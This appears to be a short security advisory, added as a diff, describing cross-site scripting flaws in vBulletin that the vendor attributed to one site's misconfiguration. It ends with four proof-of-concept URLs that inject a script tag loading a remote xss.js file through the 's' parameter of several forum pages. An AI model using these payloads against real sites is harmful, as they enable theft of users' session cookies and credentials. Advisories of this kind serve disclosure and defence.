@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/18444/info
+
+vBulletin is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+The vendor reports that this issue is specific to one site and is due to a misconfiguration of the vBulletin code; therefore, this BID is being retired.
+
+http://www.example.net/gettingInvolved.html?s=">">">">">"><SCRIPT%20SRC=http://www.example.com/xss.js></SCRIPT><"<"<"<"
+http://www.example.net/forums/register.php?s=\\">">">">">"><SCRIPT%20SRC=http://www.example.com/xss.js></SCRIPT><"<"<"<"&action=signup
+http://www.example.net/forums/member.php?action=editprofile&s=">">">">&#039;>&#039;>&#039;><SCRIPT%20SRC=http://www.example.com/xss.js></SCRIPT><"<"<"<&#039;<&#039;
+http://www.example.net/library/index.html?s=questions">">">">">"><SCRIPT%20SRC=http://www.example.com/xss.js></SCRIPT><"<"<"<"
